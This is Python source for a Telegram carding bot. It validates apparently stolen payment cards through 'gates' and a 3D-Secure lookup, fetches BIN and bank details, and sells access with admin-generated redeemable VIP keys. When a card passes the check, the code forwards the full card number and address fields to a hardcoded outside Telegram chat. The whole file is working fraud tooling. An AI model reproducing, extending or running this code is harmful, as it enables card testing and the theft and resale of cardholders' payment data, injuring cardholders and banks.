[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 elif 'Charged' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgc)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𓆩𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆𓆪! 🎉🐥   𝐃ev : 『@Mero_221』  »»{timer}
🐥»»{typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='ccmerochk-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>╠═══════════════════════════╣
𓆩𝐊𝐞𝐲 𝐂𝐫𝐞𝐚𝐭𝐞𝐝𓆪
                       🌹💸	
✿├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
✿├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
✿├『@Mero_221』
✿├𝑲𝒆𝒚 »»»<code>{pas}</code>	
✿├𝙐𝙨𝙖𝙜𝙚»»»/redeem [𝗞𝗘𝗬]
╠════════════════════════════╣
</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	 if message.chat.username != 'ccmero':
	        return
	 gate='3D Lookup'
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 15:
	   bot.reply_to(message, f"<b>Try again after {15-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(Tele(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
	
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@Mero_221』</b>'''
	 msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
	
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@Mero_221』</b>'''
	 if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		 tok = 'التوكن'
		 acc =  'ايدي الشات'
		 mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @mohakhw1  
</b>"""
		 tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		 tlg_params = {"parse_mode": "HTML"}
		 tok = 'التوكن'
		 acb =  '-1002046977369'
		 mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		 tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		 tly_params = {"parse_mode": "HTML"}
		 a = requests.post(tly, params=tly_params)
		 i = requests.post(tlg, params=tlg_params)
		 bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
		 bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("Bot Start On ✅ ")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")